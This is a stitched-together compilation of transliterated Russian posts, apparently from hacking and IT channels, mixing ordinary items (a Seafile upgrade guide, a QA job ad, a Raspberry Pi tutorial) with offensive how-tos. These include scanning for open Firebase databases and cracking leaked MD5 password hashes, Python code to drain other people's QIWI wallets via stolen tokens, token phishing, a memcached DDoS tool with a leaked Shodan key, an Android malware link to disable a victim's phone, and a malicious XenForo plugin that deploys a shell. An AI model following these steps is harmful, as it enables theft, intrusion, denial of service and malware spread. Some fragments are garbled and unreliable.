Stro im mobil' noe pri lozhe nie na Firebase -- bes plat nom i moshch nom beken de Google>>. S tekh niches koi toch ki zre niia Firebase -- kru taia i udob naia shtu ka. Kazhet sia, chto nichego dok ruchivat' i dopili vat' zdes' ne nuzh no. No bezopas naia nas troi ka oblachnoi baze taki nuzh na, i mno gie vla del' tsy ob etom zabyva iut, cheres chur ras sla biv shis'. Nas tol' ko, chto zabyva iut o pros tei shei veshchi -- auten tifika tsii. Ishchem otkrytye bazy dannykh Po lucha etsia, chto v interne te mas sa ne zak rytykh parolem baz dan nykh, a eto leg kaia dobycha dlia zlo umysh lenni kov. Tol' ko vot vziat' i nagug lit' ikh ne poluchit sia, potomu chto v Google reshili, chto etu prob lemu mozh no reshit', pros to iskliu chiv eti bazy iz pois kovoi vydachi. Lov ko! No krai ne nenadezh no. Po isk Google po zap rosu FirebaseNich to ne mesha et nam vos pol' zovat' sia dru gim pois kovikom -- nap rimer, Bing ili DuckDuckGo. Oni vyda iut uzhe nam nogo bol' she polez noi informa tsii. Po isko vyi zap ros v Bing i DuckDuckGoChto mozh no sde lat' dal' she, pos le togo kak nai deny domeny s uiaz vimymi bazami? Otkry vaem liubuiu ssyl ku -- nap rimer, https://hacker-news.firebaseio.com/v0/topstories.json. Informa tsiia o nei bes polez na, no esli ubrat' iz ssyl ki naz vanie tab litsy topstories i osta vit' tol' ko .json, to mozh no pro verit', zashchishche na baza ili net. V etom slu chae rezul' tat vyg liadit vot tak: { "error" : "Permission denied" } Vse ver no, lich no ia by znat no udi vil sia, esli by vla del' tsy eto go sai ta dopus tili nas tol' ko vopi iushchuiu oploshnost'. No nekoto rye ee taki dopus kaiut. Minut desiat' perebo ra ssy lok, i poisk uven chaet sia uspe khom. Nai den naia otkry taia baza dan nykhIa nashel chto-to bolee inte res noe -- uchet ki s kheshami parolei. Vyb rat' ikh iz fai la nes lozhno pros tym skrip tom na Python ili uti litoi jq. Pri pomoshchi HashID opre delia em tip kheshei (eto byl MD5) i zagonia em v hashcat. Esli net dos tatoch no moshch nogo zheleza, mozh no vos pol' zovat' sia onlai novym ser visom -- tul za FindMyHash avto mati ches ki ikh pod bira et. Vse eti uti lity pre dus tanov leny v Kali Linux. Vzlom parolia cherez FindMyHashZhdem desiat' minut, i pered nami loginy i paroli v otkry tom vide. Nai den naia baza s otkry tymi parolia mi v otkry tom vide Avtomatizatsiia Si det', meniat' pois koviki i perebi rat' vse URL vruch nuiu ochen' nud no. Slish kom chas to vidish' <<error : Permission denied>>. Zna chit, pora avto mati ziro vat'! Prog rammi rovat', prav da, ne pot rebu etsia, potomu chto eto uzhe sde lali do nas. Voz' mem, k pri meru, skript za avtors tvom Fran tseska Erre ry. Skript sam pod bira et URL i ishchet uiaz vimye bazy dan nykh. Ka chaem ego i usta nav liva em zavisi mos ti: git clone https://github.com/Turr0n/firebase.git cd firebase pip install -r requirements.txt I zapus kaem: python3 firebase. py -p 4 -c 150 -dnsdumpster Kliu chi: p -- uka zyva et koliches tvo potokov (po umol chaniiu 1, mak simum 4); dnsdumpster -- generi ruet URL samos toiatel' no; s -- kakoe koliches tvo domenov generi rovat'. Da, skript ume et generi rovat' ssyl ki samos toiatel' no. Toch nee, dela et eto ne sam, a obra shchaet sia za pomoshch'iu k uti lite DNSdumpster. Re zul' tat raboty skrip taPo rezul' tatu vid no, chto iz nai den nykh baz: 37 urlov <<bitye>> ili bol' she ne sushches tvu iut; 171 baza ime et auten tifika tsiiu pri obra shchenii k dan nym i zashchishche na; od na baza s podoz reni em na uiaz vimost'; 25 baz ne zashchishche ny ili uiaz vimy.

Obnovlenie Seafile s versii 7.1.5 do 8.0.5 v Centos  Seafile upgrade to 8.0.5  Seafile -- eto krossplatformennaia sistema programmnogo obespecheniia dlia razmeshcheniia failov s otkrytym iskhodnym kodom. Faily khraniatsia na tsentral'nom servere i mogut byt' sinkhronizirovany s personal'nymi komp'iuterami i mobil'nymi ustroistvami cherez prilozheniia.  Ustanavlivaem novye biblioteki Python  Dlia CentOS 7  $ sudo yum install python3-devel mysql-devel gcc gcc-c++ -y  Delaem sim link na biblioteku libmysqlclient, bez etogo na sleduiushchem shage poiavliaetsia oshibka/bin/ld: cannot find -lmysqlclient  $ sudo ln -s /usr/lib64/mysql/libmysqlclient.so.18 /usr/lib/libmysqlclient.so  Prodolzhaem ustanovku bibliotek Python  $ sudo pip3 install future $ sudo pip3 install mysqlclient==2.0.1 sqlalchemy==1.4.3  Dlia CentOS 8  $ yum install python3-devel mysql-devel gcc gcc-c++ -y $ sudo pip3 install future mysqlclient sqlalchemy==1.4.3  Ostanavlivaem servisy seafile i seahub  $ sudo systemctl stop seafile seahub  Perekliuchaemsia na pol'zovatelia Seafile  $ sudo su - seafile  Skachivaem distributiv  Seafile 8.0.5 (final'nyi reliz na segodniashnii den')  $ curl -OL https://s3.eu-central-1.amazonaws.com/download.seadrive.org/seafile-server_8.0.5_x86-64.tar.gz  Raspakovyvaem ego i peremeshchaem arkhiv v katalog installed  $ tar xzf seafile-server_8.0.5_x86-64.tar.gz $ mv seafile-server_8.0.5_x86-64.tar.gz installed  Zapuskaem skript dlia obnovleniia  $ cd seafile-server-8.0.5/upgrade/ $ ./upgrade_7.1_8.0.sh  Perekliuchaemsia na predydushchego pol'zovatelia (s pravami sudo)  $ exit  Zapuskaem Seafile 8.0.5 server  $ sudo systemctl start seafile seahub  https://itdraft.ru/2021/06/01/obnovlenie-seafile-s-versii-7-1-5-do-8-0-5-v-centos/   #Centos, #Seafile, #Upgrade

Freimvork dlia probiva OSINT-SAN  Dlia polnotsennoi raboty nam ponadobiatsia API, kotorye mozhno poluchit' na sleduiushchikh saitakh i potom obiazatel'no zapisyvaem ikh v settings.py:  API dlia polucheniia informatsii o nomere:   numverify API | Free Phone Number Validation & Lookup API API dlia polucheniia informatsii whois ipstack - Free IP Geolocation API Shodan API Shodan Search Engine Proverka na CMS API & Batch Detections - What CMS? Gmap dlia gui Google Maps Platform | Google Developers VirusTotal besplatnaia sluzhba proverki https://developers.virustotal.com/v3.0/reference Hunter.io API dlia polucheniia svedenii o @mail Hunter API - Overview ZoomEye API, vkhod osushchestvliaetsia putem avtorizatsii v samom instrumente ZoomEye - Cyberspace Search Engine Torrent API Cooperation CMS detect Detect which CMS a site is using - What CMS?  Kak tol'ko vy vveli vse svoi API, perekhodim k ustanovke  sudo apt update sudo apt upgrade -y git clone https://github.com/Bafomet666/OSINT-SAN.git cd OSINT-SAN sudo apt install -y python3-pip sudo pip3 install -r requerements.txt  V slozhnykh moduliakh, vam budet predostavlen vybor dopolnitel'noi ustanovki modulei.  Esli vdrug voznikli oshibki pri ustanovke zavisimostei, podskazki tut: Reshaem problemy s zavisimostiami * Issue #11 * Bafomet666/OSINT-SAN  Zapuskaem komandoi: python3 osintsan.py  Parol' i login khranitsia v pablike telegram - Bafomet OSINT  Instrument zapuskaetsia v dvukh rezhimakh: Esli vam nuzhny funktsii bez root [ zelenoi strokoi ], zapuskaite v terminale: python3 osintsan.py Esli vam nuzhny funktsii root [ krasnoi strokoi], zapuskaite v terminale: sudo python3 osintsan.py  Posle uspeshnoi avtorizatsii, vam budet dostupno meniu s instrumentami.  Informatsiiu o kazhdom module mozhno prochitat' na stranitse freimvorka. Zdes' raspisyvat' ne budu, chtoby ne dublirovat' informatsiiu.  Mogu skazat' ot sebia, chto proekt aktivno razvivaetsia i rabotaet vpolne dostoino. Ochen' raduet, chto mnogo resursov dlia poiska dostupno iz korobki i ne nado lazit' po kuche saitov i iskat' infu.

subdomains by looking at Google Analytics IDs  > Python/GO versions  > By @JosueEncinar  ">> Get related domains / subdomains by looking at Google Analytics IDs> Python/GO versions> By @JosueEncinar  This script try to get related domains / subdomains by looking at Google Analytics IDs from a URL. First search for ID of Google Analytics in the webpage and then request to builtwith with the ID.  Note: It does not work with all websites.It is searched by the following expressions:  ->  "www\.googletagmanager\.com/ns\.html\?id=[A-Z0-9\-]+"-> GTM-[A-Z0-9]+->  "UA-\d+-\d+"  Available versions:    Installation:Installation according to language.  Python  > git clone https://github.com/Josue87/AnalyticsRelationships.git> cd AnalyticsRelationships/Python> sudo pip3 install -r requirements.txt  GO  > git clone https://github.com/Josue87/AnalyticsRelationships.git> cd AnalyticsRelationships/GO> go build -ldflags "-s -w"  UsageUsage according to language  Python  > python3 analyticsrelationships... #analytics #analyticsrelationships #google #python3 #subdomains

Kradem den'gi s QIWI-koshel'ka  SimpleQIWI -- skript dlia osushchestvleniia denezhnykh tranzaktsii v platezhnoi  sisteme QIWI, ispol'zuia API QIWI-koshel'ka.    Sluzhba podderzhki platezhnoi sistemy QIWI zaiavliaet, chto pri pomoshchi API-kliucha  mozhno sovershat' nad koshel'kom sleduiushchie deistviia:    Prosmatrivat' podrobnuiu informatsiiu o koshel'ke.  Poluchat' balans koshel'ka.  Prosmatrivat' istoriiu platezhei.  Provodit' platezhi bez podtverzhdeniia po SMS.  Esli zloumyshlennik poluchit dostup k API-kliuchu zhertvy, to zloumyshlenniku  otkryvaetsia prakticheski polnyi dostup k koshel'ku.    Ustanovka i ekspluatatsiia  Otkryvaem terminal i vvodim komandu dlia obnovleniia paketov:  sudo apt-get update && apt-get upgrade    Ustanavlivaem python3:  sudo apt-get install python3-pip -y    Ustanavlivaem git s pomoshch'iu komandy:  sudo apt-get install git    Dalee kloniruem repozitorii instrumenta s GitHub:  git clone https://github.com/Emberium/SimpleQIWI    Perekhodim v direktoriiu utility:  cd SimpleQIWI    Posle ustanovki dostatochno budet vnesti nekotorye pravki v skripte, chtoby s  pomoshch'iu instrumenta obnulit' chuzhoi balans QIWI-koshel'ka.    Soderzhanie skripta:    from SimpleQIWI import *    token = "VASh TOKEN" # https://qiwi.com/api    phone = "VASh TELEFON"    api = QApi(token=token, phone=phone)    print(api.balance)    api.pay(account="TELEFON POLUChATELIa", amount=1, comment='Privet  mir!')    print(api.balance)  Est' eshchio odin sposob    [SRC]from SimpleQIWI import * # Import modulia    token=input('Token: ') # Zapros tokena u pol'zovatelia  phone=input('Nomer koshel'ka: ') # Zapros nomera koshel'ka (Telefonnogo nomera)  api = QApi(token=token, phone=phone) # Zanesenie v "Sektor" vsei informatsii    print('Vyberite funktsiiu: ')  print('[1] - Balans scheta')  print('[2] - Vyvod deneg')  vvod = input("")[/SRC]    Chto eto delaet?  Vse ochen' prosto!  Snachala my zaprashivaem u pol'zovatelia Token i Nomer koshel'ka.  Posle etogo zanosim v peremennuiu api Token i Nomer koshel'ka  QApi - Modul'naia funktsiia    Vtoroi punkt, pishem sleduiushchee:   [SRC]def info():  print('Balans klienta s nomerom', phone, 'raven: ', api.balance) # Vyvod balansa pol'zovatelia s nomerom vvedenym ranee  [/SRC]    Sdelali funktsiiu, kotoraia budet vyvodit' balans koshel'ka.  Idem k tret'emu punktu:   [SRC]def vanish():  summ = input('Vvedite summu: ')  num = input('Nomer koshel'ka: ') # Vash nomer koshel'ka  try:  api.pay(account = str(num), amount = int(summ), comment = ' ') # Vyvod deneg  print('Balans klienta s nomerom', phone, 'raven: ', api.balance)  except QIWIAPIError: # Oshibka pri vyvode deneg samomu sebe  print("Oshibka 1. Nevozmozhno osushchestvit' platezh samomu sebe.")  [/SRC]    Zdes' my sozdali eshche odnu posledniuiu funktsiiu, v kotoroi nuzhno ukazat':  Komu budet perechisleno.  Skol'ko budet perechislenno  Kommentarii (Ne obiazatelen)  Takzhe, posle perevoda sredstv vyvoditsia balans pol'zovatelia u kotorogo byli sniaty den'gi.    Gotovo!  Teper' nuzhno soedinit' eto voedino:   [SRC]from SimpleQIWI import *    token=input('Token: ')  phone=input('Nomer koshel'ka: ')  api = QApi(token=token, phone=phone)    print('Vyberite funktsiiu: ')  print('[1] - Balans scheta')  print('[2] - Vyvod deneg')  vvod = input("")    def info():  print('Koshelek naiden!')  print('Balans klienta s nomerom', phone, 'raven: ', api.balance)    def vanish():  summ = input('Vvedite summu: ')  num = input('Nomer koshel'ka: ')  try:  api.pay(account = str(num), amount = int(summ), comment = ' ') #Vyvod deneg,  print('Balans klienta s nomerom', phone, 'raven: ', api.balance)  except QIWIAPIError:  print("Oshibka 1. Nevozmozhno osushchestvit' platezh samomu sebe.")    if vvod == "1":  info()  elif vvod == "2":  vanish()  else:  quit  [/SRC]   My poluchili programmu kotoraia budet snimat' den'gi s akkaunta pol'zovatelia za ego pokupki.

My ishchem Junior QA Automation Engineer dlia testirovaniia nashei novoi tsifrovoi platformy.    Chem predstoit zanimat'sia? Testirovanie API  Napisanie avtomatizirovannykh testov  Sostavlenie otchetnosti o provedennom testirovanii, zavedenie bag-repotov   Chto my zhdem ot tebia? Znanie osnov testirovaniia. Ponimanie chto takoe test-keis, test-s'iut, chek-list, kakie vidy testirovaniia sushchestvuiut, kak sostavliat' bag reporty;  Bazovye znaniia Python. Znanie bazovykh tipov i struktur dannykh, uslovnykh operatorov, ponimanie raboty funktsii i dekoratorov;  Opyt raboty s odnimi iz freimvorkov testirovaniia - Unittest, pytest, Nose. My ispol'zuem pytest;  Bazovoe ponimanie chto takoe API, idei kak ego testirovat';  Umenie rabotat' s github;   Pliusom dlia tebia budet: Opyt napisaniia avtomatizirovannykh testov. Kruto esli u tebia est' opyt. Esli net, to nauchim.  Opyt s API cherez Insomnia, Postman, Swagger i t.p. U nas na vsekh servisakh podniat Swagger.  Opyt raboty v kakom-nibud' bag-tekere ili trekere zadach -- JIRA, Trello, Redmine i t. p. My na proekte ispol'zuem JIRA.   My s radost'iu mozhem predlozhit' tebe: 1. Aktivnuiu rabotu i aktivnuiu zhizn' vnutri nashei komandy:  My postoianno znakomimsia s novymi produktami i tekhnologiiami. Dlia nas estestvenno uchit'sia samim i delit'sia znaniiami i opytom drug s drugom. My liubim rabotat' i ne proch' vmeste otmetit' svoi dostizheniia.    2. Komfortnyi ofis v peshei dostupnosti ot metro, vkusnyi kofe i privetlivye litsa kolleg.  3. Rabota v unikal'nom proekte, zadachei kotorogo iavliaetsia pereosmyslenie rynka postavok telekommunikatsionnogo oborudovaniia v krupneishikh stranakh mira. Podrobnostiami gotovy delitsia s nashimi soiskateliami.    Dokhod: obsuzhdaem s final'nymi kandidatami, pozhaluista, ukazyvai svoi startovye orientiry po ZP v reziume ili soprovoditel'nykh pis'makh.    Rezhim raboty: 5/2, gibkoe nachalo trudovogo rabochego dnia s 08:00 do 11:00. I esli ona tebia zainteresovala -- to vot tebe srazu testovoe zadanie:    Protestirui API na saite bzteltestapi.pythonanywhere.com i prishli ssylku na repozitorii s avtomatizirovannymi testam na Python3 ili podrobnyi otchet o testirovanii (forma otcheta proizvol'naia). Avtotestami mozhno na vybor pokryt' avtorizatsiiu ili kontent. Freimvork testirovaniia - liuboi. Pri ruchnom testirovanii budet otsenivat'sia polnota pokrytiia testami.    K sozhaleniiu reziume, my ne smozhem rassmotret' bez testovogo zadaniia.    Udachi tebe! Zhdem tebia v nashei komande! Vychislitel'nye instrumenty nezamenimy prakticheski vo vsekh nauchnykh distsiplinakh.  Nadezhnoe, tshchatel'no razrabotannoe programmnoe obespechenie imeet reshaiushchee znachenie dlia analiza i pravil'noi interpretatsii takikh dannykh, osobenno v sluchaiakh, kogda generiruiutsia bol'shie ob'emy issledovatel'skikh dannykh, kotorye neobkhodimo bystro obrabatyvat'.  Tem ne menee, nauchnoe programmnoe obespechenie mozhet imet' nedostatki v kachestve.  Dlia avtomatizirovannoi otsenki kachestva programmnogo obespecheniia komp'iuternye uchenye iz Tekhnologicheskogo instituta Karlsrue (KIT) i Geidel'bergskogo instituta teoreticheskikh issledovanii (HITS) razrabotali instrument SoftWipe.  <<Sobliudenie standartov kodirovaniia redko rassmatrivaetsia v nauchnom programmnom obespechenii, khotia ono mozhet dazhe privesti k nevernym nauchnym rezul'tatam>>, -- govorit professor Aleksandros Stamatakis, kotoryi rabotaet kak v HITS, tak i v Institute teoreticheskoi informatiki (ITI) KIT.  Programmnyi instrument SoftWipe s otkrytym iskhodnym kodom obespechivaet bystryi, nadezhnyi i ekonomichnyi podkhod k resheniiu etoi problemy putem avtomaticheskoi otsenki sobliudeniia standartov razrabotki programmnogo obespecheniia.  Pomimo razrabotki vysheupomianutogo instrumenta, spetsialisty po informatike protestirovali 48 instrumentov nauchnogo programmnogo obespecheniia iz razlichnykh oblastei issledovanii, chtoby otsenit', v kakoi stepeni oni sootvetstvuiut standartam kodirovaniia.  <<SoftWipe takzhe mozhno ispol'zovat' v protsesse proverki nauchnogo programmnogo obespecheniia i podderzhivat' protsess vybora programmnogo obespecheniia>>, -- dobavliaet Adrian Zapletal.  Uchenik magistra i ego odnokursnik Dmitrii Khioler vnesli sushchestvennyi vklad v razvitie SoftWipe.  Pri vybore kriteriev otsenki oni opiralis' na sushchestvuiushchie standarty, kotorye ispol'zuiutsia v kriticheskikh dlia bezopasnosti sredakh, takikh kak NASA ili TsERN.  <<Nashe issledovanie vyiavilo ogromnye raskhozhdeniia v kachestve programmnogo obespecheniia>>, -- govorit soavtor professor Karsten Sints iz ITI.  Mnogie programmy, takie kak covid-sim, kotoryi ispol'zuetsia v Velikobritanii dlia matematicheskogo modelirovaniia bolezni COVID-19, imeli ochen' nizkii pokazatel' kachestva i poetomu plokho rabotali v reitinge.  Issledovateli rekomenduiut po umolchaniiu ispol'zovat' takie programmy, kak SoftWipe, pri vybore i proverke programmnogo obespecheniia dlia nauchnykh tselei.  Kak rabotaet SoftWipe?  SoftWipe -- eto konveier, napisannyi na iazyke programmirovaniia Python3, kotoryi ispol'zuet neskol'ko dostupnykh staticheskikh i dinamicheskikh analizatorov koda (bol'shinstvo iz nikh nakhodiatsia v svobodnom dostupe) dlia otsenki kachestva koda programmnogo obespecheniia, napisannogo na C / C ++.  V etom protsesse SoftWipe kompiliruet programmnoe obespechenie, a zatem vypolniaet ego, chtoby vo vremia vypolneniia mozhno bylo obnaruzhit' oshibki programmirovaniia.  Osnovyvaias' na rezul'tatakh ispol'zuemykh instrumentov analiza koda, SoftWipe vychisliaet otsenku kachestva ot 0 (plokho) do 10 (otlichno), chtoby vychislit' obshchuiu itogovuiu otsenku.

Biblioteka subprocess  Samyi funktsional'nyi klass v dannoi biblioteke - Popen. On tak zhe pozvoliaet vypolniat' dochernie programmy v novykh protsessakh, no pozvoliaet namnogo gibche s nimi vzaimodeistvovat'.  K primeru esli u vas server na linuks, o obiazatel'no ustanovlen python 2. Privedennyi nizhe kod zamenit interpretator python 2 na sovremennuiu versiiu python 3:  'test.py'], executable='python3')  My mozhem tak zhe sokhranit' ves' vvod i oshibki ili perenapravit' ikh priamo v fail dlia sokhraneniia. A mozhno zastavit' vypolniat'sia protsess v fonovom rezhime ili dozhdat'sia ee zaversheniia. Poslednie dve vozmozhnosti mozhno ispol'zovat' asinkhronno s asyncio.

Vykhodnye - khoroshii povod dlia novostei! :)  Vo-pervykh, [https://vk.com/wall-201936679_48|proekt SiDock@home uspeshno proshiol Pentathlon], poluchiv tem samym, khoroshii zariad moshchnosti na 2 nedeli;  Vo-vtorykh, esli vam interesno poigrat'sia v kakoi-nibud' elektronnyi konstruktor, to chut' nizhe - nebol'shoi primerchik. Itak, dano: 1) Raspberry Pi; 2) Dve sensornye knopki v vide Troyka-modulei ot Amperki; Neobkhodimo registrirovat' fakt prikosnoveniia k knopkam i vydvat' ob etom opoveshchenie v vide tekstovogo soobshcheniia v terminal. Pri kasanii pervoi knopki - odno, pri kasanii vtoroi - drugoe, a esli byli nazhaty dve knopki odnovremenno, to soobshchat' ob odnovremennom nazhatii i zavershat' rabotu programmy.  Smotrim na kharakteristiki sensornykh knopok i vidim, chto oni mogut rabotat' ot 5V i 3.3V. Zatem smotrim na opisanie kontaktor na "malinke" (kartinka No.  1) i vidim, chto na nei est' kontakty pitaniia i s 3.3V i 5V. Dlia dannoi igrushki vybral 3.3V. Obrashchaem vnimanie na raznoobraznost' numeratsii kontaktov! Nomer "fizicheskogo polozheniia" kontakta v kolodke, ne sovpadaet s numeratsiei ot izgotovitelia chipa - Broadcom, kotorye mozhno ukazyvat' v programme (dalee - prosto BCM). Dlia kazhdoi knopki nam potrebuetsia 3 kontakta: Signal, Pitanie i Zemlia. Na knopkakh oni tak oboznachny S, V, G (na drugoi storone knopki est' eshchio i kontakt M, kotoryi reguliruet skorost' srabatyvaniia, no my ego seichas zadeistvovat' ne budem). Snova vzglianuv na opisanie kontaktov "malinki", my mozhem vybrat' kontakty so sleduiushchimi nomerami po ikh polozheniiu v kolodke: 1-ia knopka: 1-i (pitanie), 6-i (zemlia), 8-i (signal, nomer BCM = 14) 2-ia knopka: 17-i (pitanie), 20-i (zemlia), 18-i (signal, nomer BCM = 24) Sobiraem "sistemu", tak, kak pokazano na kartinke 2 i 3 (luchshe - v perchatkakh!), vkliuchaem "malinku" i zapuskaem prosten'kuiu programmku na Python-e (eio polnyi kod prilozhen, a chut' nizhe - poiasnenie osnovnykh detalei). Zapustit' programmku mozhno komandoi  python3 pi_sample_sensor_button.py (Esli, konechno, sam fail ne pereimenovali).  V programmke snachala perechisliaem bibliotechnye moduli, kotorye, kotorye nam potrebuiutsia: import RPi.GPIO as GPIO from time import sleep Zatem - zadaiom nachal'nye znacheniia peremennykh: checkInterval = 0.1 i t.d. Posle - ukazyvaem kakuiu numeratsiiu budet ispol'zovat' pri obrashchenii k kontaktam: GPIO.setmode(GPIO.BCM) I to, chto nashi "signal'nye" kontakty dolzhny rabotat' na priiom signala: GPIO.setup(firstButtonPin, GPIO.IN) GPIO.setup(secondButtonPin, GPIO.IN) Zatem - pechataem privetstvie i nachinaem osnovnoi tsikl, v kotorom oprashivaem nashi knopki:  print('Hello! Press on button please!') try:  while isRun:  ...  Opros tekushchego sostoianiia knopok proizvodim strochkami  isFirstButtonPressed = GPIO.input(firstButtonPin)  isSecondButtonPressed = GPIO.input(secondButtonPin)  Dalee v kode idiot opredelenie togo, chto nam nado delat'. Tak kak reagirovat' nam nado na sobytie nazhatiia na knopku, a ne prosto na eio nazhatost' v dannyi moment, to schitannoe sostoianie knopok nam prikhoditsia sravnivat' s predydushchim!  Komandoi sleep(checkInterval) my prosto ukazyvaem programme nekotoroe vremia nichego ne delat', a v kontse - zavershaem rabotu s kontaktami: finally:  print('Exit')  GPIO.cleanup()  Vsio! :)

Ispol'zuem chuzhie servera dlia DDoS ataki  Mnogie iz Vas, navernoe, slyshali o nashumevshei atake na Github. Dlia eio usileniia ispol'zovalis' servera memcached i v rezul'tate moshchnost' sostavila okolo 1,35Tb/sek. Ne slabo tak, da?    Segodnia my rassmotrim instrument, kotoryi pozvoliaet nam povtorit' podobnuiu ataku. Dlia etogo na github est' spetsial'nyi instrument pod nazvaniem Memcrashed.   Rabotat' budem v Kali Linux  Zapuskaem, otkryvaem terminal i dlia snachala kak vsegda vvodim:    apt update  apt upgrade  Ustanovim Python, esli vy eshche etogo ne delali:    apt-get install python3  apt-get install python3-pip  Zatem ustanovim eshche dva neobkhodimykh komponenta    pip install scapy  pip install shodan  Skachivaem faily programmy s Github    git clone https://github.com/zadachnik/memcrashed-ddos.git  Perekhodim v papku    cd memcrashed-ddos  Zatem    pip install -r requirements.txt  Primechanie:  Esli pri ustanovke kakikh-to komponentov u vas vyskakivaet oshibka, mozhete poprobovat' pisat' komandu tak:    pip3 install ...  Prodolzhaem  Dlia osushchestvleniia ataki nam ponadobitsia spetsial'nyi API Key. Ego mozhno poiskat' s pomoshch'iu Google ili na tom zhe Github. Vvodim chto-to tipa "api key" "api key shodan" i t.d.    Dlia primera ia voz'mu tot, chto predstavlen na github    Sozdadim fail api.txt s nashim kliuchom:    echo "PSKINdQe1GyxGgecYz2191H2JoS9qvgD" > api.txt  Povtorius' vy mozhete ispol'zovat' svoi API Key    Zapuskaem  python3 Memcrashed.py  Dalee vsio prosto.   Vas budut sprashivat' est' li u vas lokal'nye boty (sokhranennyi poisk Shodan) ili zhe iskat' po api key na Shodan. Tut vybiraem vtoroi variant.   Sokhraniat' li rezul'tat dlia sleduiushchego raza - reshat' vam.    Dalee poprosiat vvesti:    IP tseli  Po kakomu portu proizvodit' ataku (tut nuzhen otkrytyi port u tseli). Moshchnost' ataki ( Enter preferred power (Default 1): )  Enter payload contained inside packet - pishem, naprimer, 2 ili 100

Vsem privet! Obychno, kogda ia sobiraiu korzinu v supermarkete, ia beru produkty po ocheredi v tom poriadke, v kakom oni nakhodiatsia v spiske. Nedavno ia shel po magazinu i, navorachivaia ocherednoi krug v poiskakh tovara, kotoryi lezhit v otdele, gde ia uzhe byl, ia podumal, mozhno bylo by sekonomit' uimu vremeni sostavliaia spisok tak, chtoby, sobiraia produkty podriad, ia by shel po optimal'nomu marshrutu, ne prilagaia umstvennykh usilii. Sperva ia khotel zaranee sostavliat' spisok takim obrazom, no eto slozhno i neinteresno, tak chto ia reshil avtomatizirovat' etot protsess i vot chto iz etogo vyshlo:

Ubivaem telefon svoemu nedrugu.    Infect -- eto bash-skript, s pomoshch'iu kotorogo vy mozhete rasprostraniat' virus dlia android, otpravliaia spetsial'nuiu vredonosnuiu ssylku.    Ustanovka i ekspluatatsiia  Otkryvaem terminal i vvodim komandu dlia obnovleniia paketov:    pkg update && pkg upgrade    Ustanavlivaem git i python s pomoshch'iu komand:    pkg install git    pkg install python2    pkg install python3    Ustanavlivaem lolcat:    pip install lolcat    Kloniruem repozitorii s GitHub:    git clone https://github.com/noob-hackers/Infect    Perekhodim v papku instrumenta:    cd Infect    I zapuskaem:    bash infect.s    Posle zapuska vybiraem pervyi punkt. Dalee soglashaemsia so vsem, nazhimaia tri raza podriad Enter. V konechnom itoge sozdastsia vredonosnaia ssylka, kotoruiu nuzhno otpravit' nashei zhertve. Kogda zhertva pereidet po dannoi ssylke, na ustroistvo skachaetsia fail pod nazvaniem System Update.apk  Esli zhertva ustanovit i zapustit fail, to telefon zhertvy budet zarazhen virusom Elite, kotoryi ne pozvolit vospol'zovat'sia ustroistvom.

Kak ia grabil qiwi koshel'ki.    Ia vzlamyval koshel'ki cherez fishing tokenov. A takzhe cherez klient qiwi v termux, i nebol'shoi utility na python.    Poocheriodno vvodim komandy (gde Y/n pishem Y i stavim Enter.)    apt update    apt upgrade    apt install git    apt install php    apt install python    apt install libgnutls    pip install SimpleQIWI    pip install colorama    git clonehttps://github.com/WannaDeauth/qiwi_api    cd qiwi_api    python qiwi.py    Poluchenie tokena  My ustanavlivaem fishing sait  Pishem 3    Tak zhe v nashem sluchae fishing stoit na  http://localhost:8080  Chtoby sdelat' ego publichnym  Dlia nachala kopiruem komandu (belym tsvetom)    Otkryvaem vtoruiu sessiiu v termukse    I vstavliaem etu komandu  ssh -R 80:localhost:8080 qiwi-api-token-form-id@ssh.localhost.run  Zhelatel'no ustanovit' shh klient na termux.    2 ssylki  Na kotorykh i budet raspolagat'sia nasha "lovilka tokenov"    Vse!  Teper' pishem komandy:  cd fish  cat counter.txt    Kak bespalevno sniat' babki.    git clone https://github.com/batyarimskiy/qiwi    poluchaem token tut - https://qiwi.com/api (Daem vse razresheniia)  cd qiwi  pip3 install -r requirements.txt    Zapusk!    python3 qiwi.py    Nu, a dalee kak v obychnom qiwi, tol'ko s proxy i tokenom.    Utilitka na python.    Dlia nachala - nam nuzhen Python 3,6. Esli net, to skachivaete s ofitsial'nogo saita - https://www.python.org/downloads/release/python-360/.  Zakhodim v papku s pitonom, dalee v papku Scripts i sozdaem bat fail s kodom:  pip install SimpleQIWI  U vas nachniotsia zagruzka.    Posle togo, kak ustanovitsia komponent, sozdaem fail Balance_Check.py    Pishem tuda kod:    from SimpleQIWI import *    print('Q I W I Software 1.0 / coded by m1wka!');    token=input('Enter token: ')    phone=input('Enter phone: ');    api = QApi(token=token, phone=phone)    print('Balance Founded')    print(api.balance)    input()  Pozdravliaiu! My sdelali sebe soft-cheker dlia proverki balansov!    Tam gde Enter token: kak raz vvodim API togo koshel'ka, balans kotorogo khotim proverit'.  Tam takzhe vyidet Enter Phone, no ego vvodit' ne obiazatel'no. Prosto nazhmite Enter.  Programma vydast nechto takoe:  qiwi Software 1.0 / coded by m1wka!    Enter token:  *token kotoryi vy vveli*    Enter phone: 3    Balance Founded    [0.0, 2497.12]  Vot eto samoe poslednee chislo i est' BALANS KOShEL'KA - 2497,12R.

Prepodavateli, rabotaiushchie v rossiiskikh VUZakh, periodicheski stalkivaiutsia s neobkhodimost'iu predostavit' administratsii spisok svoikh nauchnykh i uchebno-metodicheskikh rabot. Naprimer, dlia (pere)izbraniia na dolzhnost', prisvoeniia zvaniia i t. d. Format predstavleniia informatsii, forma No.  16, razrabotan nevest' kogda i do sikh por ispol'zuetsia v biurokraticheskikh nedrakh Ministerstva Nauki i Vysshego Obrazovaniia RF. Mne stalo len' zapolniat' etu formu vruchnuiu i ia napisal nebol'shoi python stsenarii, kotoryi generiruet nuzhnuiu tablitsu na osnove informatsii, poluchennoi iz nauchnoi elektronnoi biblioteki elibrary.ru. Vozmozhno, komu-to eto budet interesno, tak chto nizhe privedeno opisanie etoi protsedury...

Generatsiia vredonosnykh plaginov dlia XenForo  XenSploit -- eksploit, generiruiushchii vredonosnyi plagin dlia foruma na XenForo. Plagin generiruetsia c zadannymi dannymi, kotorye vidit konechnyi administrator foruma, dalee kliuch dostupa k shellu, kotoryi budet razvernut na mashine zhertvy.  Na dannyi moment bol'shinstvo forumov sidiat na XenForo, a nedavno rozhdennye i podavno, poetomu s pomoshch'iu SI budet neslozhno podognat' komu nibud' takoi zarazhennyi plagin. Potentsial u eksploita ochen' bol'shoi, v tom chisle, chto mozhno idti na massu forumov i napisat' skaner, kotoryi budet iskat' zarazhennye forumy po zadannym parametram.  Ustanovka  git clone https://github.com/securityhigh/XenSploit cd XenSploit  Ispol'zovanie  python3 build.py  Khaking v khatu

